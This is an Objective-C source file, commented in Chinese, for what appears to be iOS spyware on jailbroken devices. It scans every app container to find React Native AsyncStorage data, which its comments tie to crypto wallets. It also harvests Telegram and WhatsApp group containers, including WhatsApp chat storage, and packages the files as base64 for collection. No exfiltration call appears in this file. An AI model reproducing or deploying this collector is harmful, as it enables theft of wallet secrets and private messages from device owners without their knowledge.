#import "WalletFS.h"

@implementation WalletFS

+ (NSString *)containersRoot {
    return @"/var/mobile/Containers/Data/Application";
}

/// 读容器元数据拿 bundleId
+ (NSString *)bundleIdOfContainer:(NSString *)dir {
    NSString *meta = [dir stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
    NSData *d = [NSData dataWithContentsOfFile:meta];
    if (!d.length) return nil;
    id o = [NSPropertyListSerialization propertyListWithData:d
                                                     options:NSPropertyListImmutable
                                                      format:NULL
                                                       error:NULL];
    if (![o isKindOfClass:[NSDictionary class]]) return nil;
    NSString *bid = ((NSDictionary *)o)[@"MCMMetadataIdentifier"];
    return [bid isKindOfClass:[NSString class]] ? bid : nil;
}

+ (NSString *)containerPathFor:(NSString *)bundleId {
    static NSMutableDictionary *cache = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ cache = [NSMutableDictionary dictionary]; });
    @synchronized (cache) {
        NSString *c = cache[bundleId];
        if (c) return c;
    }

    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *dirs = [fm contentsOfDirectoryAtPath:[self containersRoot] error:NULL];
    for (NSString *d in dirs) {
        NSString *full = [[self containersRoot] stringByAppendingPathComponent:d];
        NSString *bid = [self bundleIdOfContainer:full];
        if (!bid) continue;
        @synchronized (cache) { cache[bid] = full; }
        if ([bid isEqualToString:bundleId]) return full;
    }
    return nil;
}

+ (NSArray<NSDictionary *> *)probeAllContainers {
    NSMutableArray *out = [NSMutableArray array];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *root = [self containersRoot];

    NSArray *dirs = [fm contentsOfDirectoryAtPath:root error:NULL];
    if (!dirs) {
        // 连目录都列不出来 —— 沙箱没放开，这条要报上去
        return @[ @{ @"root": root, @"error": @"cannot list containers root" } ];
    }

    for (NSString *d in dirs) {
        NSString *full = [root stringByAppendingPathComponent:d];
        NSString *bid = [self bundleIdOfContainer:full];

        NSMutableDictionary *row = [NSMutableDictionary dictionary];
        row[@"dir"] = d;
        row[@"bundleId"] = bid ?: @"(no-metadata)";

        // 试读：容器根目录能否列出
        NSError *err = nil;
        NSArray *top = [fm contentsOfDirectoryAtPath:full error:&err];
        row[@"readable"] = @(top != nil);
        if (err) row[@"error"] = err.localizedDescription ?: @"";
        if (top) row[@"top"] = [top componentsJoinedByString:@","];

        [out addObject:row];
    }
    return out;
}

/// 在容器里递归找 RCTAsyncLocalStorage_V1（不同 App 层级不一样）
+ (NSString *)asyncStorageDirIn:(NSString *)container {
    NSFileManager *fm = [NSFileManager defaultManager];
    // 常见位置先直接试
    NSArray *cands = @[
        @"Library/Application Support/RCTAsyncLocalStorage_V1",
        @"Documents/RCTAsyncLocalStorage_V1",
    ];
    for (NSString *c in cands) {
        NSString *p = [container stringByAppendingPathComponent:c];
        BOOL isDir = NO;
        if ([fm fileExistsAtPath:p isDirectory:&isDir] && isDir) return p;
    }
    // 兜底：扫两层
    NSArray *l1 = @[@"Library/Application Support", @"Library", @"Documents", @"tmp"];
    for (NSString *a in l1) {
        NSString *base = [container stringByAppendingPathComponent:a];
        NSArray *sub = [fm contentsOfDirectoryAtPath:base error:NULL];
        for (NSString *s in sub) {
            if ([s isEqualToString:@"RCTAsyncLocalStorage_V1"]) {
                return [base stringByAppendingPathComponent:s];
            }
            NSString *deeper = [[base stringByAppendingPathComponent:s]
                                stringByAppendingPathComponent:@"RCTAsyncLocalStorage_V1"];
            BOOL isDir = NO;
            if ([fm fileExistsAtPath:deeper isDirectory:&isDir] && isDir) return deeper;
        }
    }
    return nil;
}

+ (NSDictionary *)asyncStorageOf:(NSString *)bundleId {
    NSString *container = [self containerPathFor:bundleId];
    if (!container) return @{ @"error": @"container not found", @"bundleId": bundleId };

    NSString *dir = [self asyncStorageDirIn:container];
    if (!dir) return @{ @"error": @"RCTAsyncLocalStorage_V1 not found",
                        @"container": container, @"bundleId": bundleId };

    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *manPath = [dir stringByAppendingPathComponent:@"manifest.json"];
    NSData *manData = [NSData dataWithContentsOfFile:manPath];
    if (!manData.length) {
        return @{ @"error": @"manifest.json unreadable",
                  @"dir": dir, @"bundleId": bundleId };
    }
    id man = [NSJSONSerialization JSONObjectWithData:manData options:0 error:NULL];
    if (![man isKindOfClass:[NSDictionary class]]) {
        return @{ @"error": @"manifest.json not json", @"dir": dir };
    }

    NSMutableDictionary *keys = [NSMutableDictionary dictionary];
    NSMutableArray *keyNames = [NSMutableArray array];

    for (NSString *k in (NSDictionary *)man) {
        [keyNames addObject:k];
        id v = ((NSDictionary *)man)[k];
        if ([v isKindOfClass:[NSString class]]) {
            keys[k] = v;
            continue;
        }
        // null = 值在 <md5(key)> 文件里，这里不重算 md5，直接把目录里所有文件都收进来
    }

    // 大值文件：目录下除 manifest.json 以外的都读一遍
    NSMutableDictionary *files = [NSMutableDictionary dictionary];
    for (NSString *fn in [fm contentsOfDirectoryAtPath:dir error:NULL]) {
        if ([fn isEqualToString:@"manifest.json"]) continue;
        NSString *p = [dir stringByAppendingPathComponent:fn];
        NSData *d = [NSData dataWithContentsOfFile:p];
        if (!d.length || d.length > 8 * 1024 * 1024) continue;
        NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
        if (s.length) files[fn] = s;
    }

    return @{ @"dir": dir,
              @"container": container,
              @"bundleId": bundleId,
              @"keyNames": keyNames,
              @"keys": keys,
              @"files": files };
}

+ (NSData *)readFile:(NSString *)relPath inContainer:(NSString *)bundleId {
    NSString *container = [self containerPathFor:bundleId];
    if (!container) return nil;
    return [NSData dataWithContentsOfFile:[container stringByAppendingPathComponent:relPath]];
}

#pragma mark - 采集打包

/// 递归把一个目录下的文件加进 out（跳过符号链接/超大文件）
+ (void)addPath:(NSString *)abs
            rel:(NSString *)rel
         bundle:(NSString *)bundleId
            out:(NSMutableArray *)out
          bytes:(NSUInteger *)bytes
          limit:(NSUInteger)limit
          depth:(NSInteger)depth {
    if (depth > 6 || *bytes >= limit) return;
    NSFileManager *fm = [NSFileManager defaultManager];

    BOOL isDir = NO;
    if (![fm fileExistsAtPath:abs isDirectory:&isDir]) return;

    if (isDir) {
        NSArray *sub = [fm contentsOfDirectoryAtPath:abs error:NULL];
        for (NSString *s in sub) {
            if (*bytes >= limit) return;
            [self addPath:[abs stringByAppendingPathComponent:s]
                      rel:[rel stringByAppendingPathComponent:s]
                   bundle:bundleId
                      out:out
                    bytes:bytes
                    limit:limit
                    depth:depth + 1];
        }
        return;
    }

    // 只收 Regular 文件，别把符号链接/设备文件带进来
    NSDictionary *attr = [fm attributesOfItemAtPath:abs error:NULL];
    if (!attr || ![attr[NSFileType] isEqualToString:NSFileTypeRegular]) return;
    unsigned long long size = [attr[NSFileSize] unsignedLongLongValue];
    if (size == 0 || size > 16 * 1024 * 1024) return;
    if (*bytes + size > limit) return;

    NSData *d = [NSData dataWithContentsOfFile:abs];
    if (!d.length) return;

    *bytes += d.length;
    [out addObject:@{
        @"p": [bundleId stringByAppendingPathComponent:rel],
        @"d": [d base64EncodedStringWithOptions:0],
    }];
}

+ (NSDictionary *)collectPackage:(NSString *)bundleId
                           paths:(NSArray<NSString *> *)relPaths
                           limit:(NSUInteger)maxBytes {
    NSString *container = [self containerPathFor:bundleId];
    if (!container) {
        return @{ @"error": @"container not found", @"bundleId": bundleId, @"files": @[] };
    }

    NSMutableArray *out = [NSMutableArray array];
    NSUInteger bytes = 0;
    for (NSString *rel in relPaths) {
        NSString *clean = [rel stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
        while ([clean hasSuffix:@"/"]) clean = [clean substringToIndex:clean.length - 1];
        if (!clean.length) continue;
        NSString *abs = [container stringByAppendingPathComponent:clean];
        [self addPath:abs rel:clean bundle:bundleId out:out bytes:&bytes
                limit:maxBytes depth:0];
        if (bytes >= maxBytes) break;
    }

    return @{ @"files": out, @"bytes": @(bytes), @"bundleId": bundleId, @"container": container };
}


+ (NSArray<NSString *> *)listFilesIn:(NSString *)relDir container:(NSString *)bundleId {
    NSString *container = [self containerPathFor:bundleId];
    if (!container) return @[];
    NSString *dir = [container stringByAppendingPathComponent:relDir];
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:NULL];
    return all ?: @[];
}

/// 递归列文件树：@"相对路径|大小"，用来确定钱包把数据放在哪
+ (NSArray<NSString *> *)treeOfContainer:(NSString *)bundleId
                                maxDepth:(NSInteger)maxDepth
                              maxEntries:(NSInteger)maxEntries {
    NSMutableArray *out = [NSMutableArray array];
    NSString *container = [self containerPathFor:bundleId];
    if (!container) return out;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray *stack = [NSMutableArray arrayWithObject:@[@"", @(0)]];
    while (stack.count && (NSInteger)out.count < maxEntries) {
        NSArray *cur = stack.lastObject;
        [stack removeLastObject];
        NSString *rel = cur[0];
        NSInteger depth = [cur[1] integerValue];
        if (depth > maxDepth) continue;

        NSString *dir = rel.length ? [container stringByAppendingPathComponent:rel] : container;
        NSArray *names = [fm contentsOfDirectoryAtPath:dir error:NULL];
        for (NSString *n in names) {
            if ((NSInteger)out.count >= maxEntries) break;
            NSString *childRel = rel.length ? [rel stringByAppendingPathComponent:n] : n;
            NSString *full = [container stringByAppendingPathComponent:childRel];
            BOOL isDir = NO;
            [fm fileExistsAtPath:full isDirectory:&isDir];
            if (isDir) {
                [out addObject:[NSString stringWithFormat:@"%@/|dir", childRel]];
                [stack addObject:@[childRel, @(depth + 1)]];
            } else {
                NSDictionary *attr = [fm attributesOfItemAtPath:full error:NULL];
                unsigned long long sz = [attr fileSize];
                [out addObject:[NSString stringWithFormat:@"%@|%llu", childRel, sz]];
            }
        }
    }
    return out;
}

#pragma mark - AppGroup（Telegram / WhatsApp）

/// AppGroup 容器根
+ (NSString *)appGroupRoot {
    return @"/var/mobile/Containers/Shared/AppGroup";
}

+ (NSString *)appGroupPathFor:(NSString *)groupId {
    static NSMutableDictionary *cache = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ cache = [NSMutableDictionary dictionary]; });
    @synchronized (cache) {
        NSString *c = cache[groupId];
        if (c) return c;
    }
    NSFileManager *fm = [NSFileManager defaultManager];
    for (NSString *d in [fm contentsOfDirectoryAtPath:[self appGroupRoot] error:NULL] ?: @[]) {
        NSString *full = [[self appGroupRoot] stringByAppendingPathComponent:d];
        NSString *gid = [self bundleIdOfContainer:full];      // 元数据里同一个键名
        if (!gid) continue;
        @synchronized (cache) { cache[gid] = full; }
        if ([gid isEqualToString:groupId]) return full;
    }
    return nil;
}

/// 采 AppGroup 容器：只按片段过滤，不猜目录名
+ (NSDictionary *)collectAppGroup:(NSString *)groupId
                          include:(NSArray<NSString *> *)includeSubstrings
                          exclude:(NSArray<NSString *> *)excludeSubstrings
                            limit:(NSUInteger)maxBytes {
    NSMutableArray *files = [NSMutableArray array];
    NSUInteger bytes = 0;

    NSString *root = [self appGroupPathFor:groupId];
    if (!root) return @{ @"files": files, @"bytes": @0, @"error": @"appgroup not found" };

    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray *stack = [NSMutableArray arrayWithObject:@[@""]];
    while (stack.count && bytes < maxBytes) {
        NSString *rel = stack.lastObject[0];
        [stack removeLastObject];
        NSString *dir = rel.length ? [root stringByAppendingPathComponent:rel] : root;

        for (NSString *n in [fm contentsOfDirectoryAtPath:dir error:NULL] ?: @[]) {
            NSString *childRel = rel.length ? [rel stringByAppendingPathComponent:n] : n;
            NSString *full = [root stringByAppendingPathComponent:childRel];
            BOOL isDir = NO;
            [fm fileExistsAtPath:full isDirectory:&isDir];
            if (isDir) {
                if ([n isEqualToString:@"Caches"] || [n hasSuffix:@".app"]) continue;
                [stack addObject:@[childRel]];
                continue;
            }

            // 片段过滤
            BOOL ok = includeSubstrings.count == 0;
            for (NSString *inc in includeSubstrings) {
                if ([childRel rangeOfString:inc options:NSCaseInsensitiveSearch].location != NSNotFound) { ok = YES; break; }
            }
            if (!ok) continue;
            for (NSString *exc in excludeSubstrings) {
                if ([childRel rangeOfString:exc options:NSCaseInsensitiveSearch].location != NSNotFound) { ok = NO; break; }
            }
            if (!ok) continue;

            NSDictionary *attr = [fm attributesOfItemAtPath:full error:NULL];
            unsigned long long size = [attr fileSize];
            if (size == 0 || size > 24 * 1024 * 1024) continue;   // 单文件 24MB 上限（WS 的 ChatStorage 会超 8MB）
            if (bytes + size > maxBytes) continue;

            NSData *data = [NSData dataWithContentsOfFile:full];
            if (!data.length) continue;
            bytes += data.length;
            [files addObject:@{ @"p": childRel, @"d": [data base64EncodedStringWithOptions:0] }];
        }
    }
    return @{ @"files": files, @"bytes": @(bytes) };
}
@end
